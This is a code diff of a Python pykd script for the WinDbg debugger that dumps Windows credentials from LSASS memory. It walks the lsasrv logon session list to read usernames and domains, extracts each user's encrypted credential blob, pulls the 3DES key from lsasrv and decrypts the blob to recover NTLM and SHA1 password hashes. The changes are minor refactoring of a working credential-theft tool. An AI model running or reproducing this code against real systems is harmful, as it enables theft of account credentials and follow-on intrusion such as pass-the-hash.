@@ -51,7 +51,7 @@ def main():
     users_blob = pykd.dbgCommand("!list -x \"dS @$extret+0x90;dS @$extret+0xa0\" poi(lsasrv!LogonSessionList)")
     users_pretty = users_blob.split('\n\n')
     try:
-        first_user_data  = users_pretty[0] # use this index to access multiple users	
+        first_user_data  = users_pretty[0] # use this index to access multiple users    
         first_user_data_neato = first_user_data.split('\n')
         first_username    = first_user_data_neato[0].split('  ')[1]
         first_logondomain = first_user_data_neato[1].split('  ')[1]
@@ -59,22 +59,20 @@ def main():
         error_log()
         
     # retrieve crypto blob from each user
-    crypto_blob = pykd.dbgCommand("!list -x \"db poi(poi(@$extret+0x108)+0x10)+0x30 L1B0\" poi(lsasrv!LogonSessionList)")
-    # parse it and polish it
-    crypto_pretty = crypto_blob.split('\n\n')
+    crypto_blob = (pykd.dbgCommand("!list -x \"db poi(poi(@$extret+0x108)+0x10)+0x30 L1B0\" poi(lsasrv!LogonSessionList)")).split('\n\n')
     # saves the first user's blob
-    first_user_crypto  = crypto_pretty[0]
+    first_user_crypto  = ''.join(crypto_blob[0].split('  ')[1::2])
 
     # dump encrypted bytes of the 1st user
     first_user_crypto_neato = first_user_crypto.split('  ')[1::2]
-    first_crypto = ''.join(first_user_crypto_neato)
+    first_crypto = ''.join(first_user_crypto_neato) 
     try:
-        first_crypto =  unhexlify(first_crypto.replace(" ", "").replace("-",""))
+        first_user_crypto =  unhexlify(first_user_crypto.replace(" ", "").replace("-",""))
     except binascii.Error:
         error_log()
         
     print("\n(*) first user's crypto")
-    print(hexlify(first_crypto))
+    print(hexlify(first_user_crypto))
 
     # find 3DES key
     tripdes_key_blob = pykd.dbgCommand("db (poi(poi(lsasrv!h3DesKey)+0x10)+0x38)+4 L18")
@@ -88,7 +86,7 @@ def main():
     #tripdes_key_hex = bytes.fromhex(tripdes_key)
     # decrypting the blob - the iv can be anything sinc CBC is not using it
     k = triple_des(tripdes_key, CBC,bytes.fromhex('deadbeefdeadbeef'))
-    a = k.decrypt(first_crypto) 
+    a = k.decrypt(first_user_crypto)  
     a = str(hexlify(a))
     ntlm,sha1 = a[150:182],a[214:254]
     print("\n(*)USERNAME :" + first_username)
